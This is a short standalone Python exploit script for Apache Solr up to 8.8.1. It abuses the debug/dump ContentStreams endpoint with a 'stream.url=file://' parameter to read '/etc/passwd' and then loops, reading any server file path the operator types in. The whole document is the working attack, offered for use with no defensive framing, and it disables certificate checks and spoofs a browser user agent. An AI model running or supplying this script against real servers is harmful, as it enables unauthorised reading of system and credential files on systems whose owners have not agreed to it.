#!/usr/bin/python3
#Author 9527
#Apache Solr <= 8.8.1

import requests
import os
import sys
from urllib3.exceptions import InsecureRequestWarning

if (len(sys.argv) < 2):
    print("UseAge: python3 exploit.py target")
    print("Example: python3 exploit.py https://192.168.1.2/")
    exit()
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

target = sys.argv[1]
payload = target + 'solr/demo/./debug/dump?param=ContentStreams'

data = "stream.url=file:///etc/passwd"
headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded"
            }

print("Attacking target.................")
print("=================================")

response = requests.post(payload,data = data,headers = headers,verify = False,timeout = 10)

if (response.status_code == 200):
    print("[+]Target is vuln!")
    while True:
        print("put file read location. Example: /etc/passwd")
        FileLocation = input('#: ')
        data = "stream.url=file://" + FileLocation
        headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded"
            }
        response = requests.post(payload,data = data,headers = headers,verify = False,timeout = 10)
        print(response.text)
        
else:
    print("[-]Target is not vuln")